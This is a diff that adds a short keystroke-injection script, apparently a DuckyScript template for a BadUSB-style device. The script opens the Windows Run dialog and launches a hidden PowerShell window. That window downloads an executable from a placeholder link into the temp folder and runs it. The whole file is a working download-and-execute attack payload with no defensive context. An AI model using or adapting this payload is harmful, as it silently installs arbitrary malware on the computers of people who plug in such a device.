@@ -1,0 +1,5 @@
+DELAY {delay}
+GUI r
+DELAY 350
+STRING cmd /c start /min powershell -w hidden "$f=$env:tmp; curl {link} -o '$f/r.exe'; & '$f/r.exe'"
+ENTER
